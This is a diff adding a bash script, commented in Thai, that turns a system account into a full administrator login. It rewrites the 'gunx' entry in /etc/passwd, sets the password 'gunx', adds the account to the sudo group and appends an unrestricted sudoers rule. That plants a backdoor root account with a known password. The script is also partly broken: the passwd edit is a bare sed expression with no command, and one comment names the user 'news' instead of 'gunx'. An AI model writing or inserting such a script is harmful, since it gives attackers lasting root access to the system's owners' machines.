@@ -1,0 +1,15 @@
+#!/bin/bash
+
+# ตรวจสอบว่าใช้สิทธิ์ root หรือไม่
+if [[ $(id -u) -ne 0 ]]; then
+  echo "กรุณาเรียกใช้สคริปต์นี้ด้วยสิทธิ์ผู้ดูแลระบบ (root)"
+  exit 1
+fi
+'s/gunx:x:9:9:gunx:\/var\/spool\/gunx:\/usr\/sbin\/nologin/gunx:x:9:9:gunx:\/home:/g' /etc/passwd
+echo gunx:gunx | chpasswd
+usermod -aG sudo gunx
+
+# เพิ่มสิทธิ์ให้ผู้ใช้ "news" เป็นเหมือนกับผู้ดูแลระบบ (root) ในไฟล์ sudoers
+echo "gunx ALL=(ALL) ALL" >> /etc/sudoers
+
+echo "สิทธิ์ของผู้ใช้ gunx ได้ถูกกำหนดให้เป็นเหมือนกับผู้ดูแลระบบ (root) ในไฟล์ sudoers"
